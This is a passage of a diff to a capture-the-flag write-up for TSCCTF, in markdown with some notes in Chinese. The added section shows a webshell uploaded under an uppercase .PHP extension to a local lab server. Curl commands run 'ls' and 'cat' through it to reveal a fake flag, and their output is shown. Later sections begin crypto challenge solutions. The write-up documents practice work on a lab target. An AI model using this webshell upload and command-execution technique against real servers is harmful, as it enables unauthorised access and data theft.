+    http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls
+    ```
+    ![image](https://hackmd.io/_uploads/B1RBr0ljp.png)
+
+#### Exploit - Upload Webshell
+Payload: 
+```bash
+$ curl "http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls%20/"
+<html><body><h1> Exchange result </h1><p>bin
+boot
+dev
+etc
+flag-lMXptmyC
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+$ curl "http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=cat%20/flag-lMXptmyC"
+<html><body><h1> Exchange result </h1><p>TSCCTF{FAKEFLAG}
+ TWD = TSCCTF{FAKEFLAG}
+ PHP</p><a href='/'>Back to Home</a></body></html>%
+```
 ## Crypto
 ### CCcollision
 #### Source Code
 :::spoiler
-```python
+```python=
 from hashlib import md5
 from string import ascii_lowercase, digits
 from random import choice
@@ -603,7 +1107,7 @@ Flag: `TSC{2a92efd3d9886caa0bc437f236b5b695c54f43dc9bdb7eec0a9af88f1d1e0bee}`
 ### Encoded not Encrypted
 #### Source Code
 :::spoiler
-```python
+```python=
 from random import choice, randint
 from string import ascii_uppercase
 from secret import FLAG
@@ -665,7 +1169,7 @@ if user_input == ans:
 4. 4. 轉換成八進制
 
 作者有給hint，我們可以根據hint知道他是用哪一個方式encode，而最難的地方是八進制，因為不同的printable char會決定轉換後是三個char還是兩個char，假設原本的plaintext是==Summer2011==，這種同時包含數字和英文，encode完會變成==12316515515514516262606161==，但是其中英文的部分他是每三個string構成，而數字的部分就是每兩個string構成，如果只是知道他用八進制的方式encode，應該沒有辦法解決這樣的狀況，目前也還沒想到相對應的解法
-```python
+```python=
 from pwn import *
 import string
 
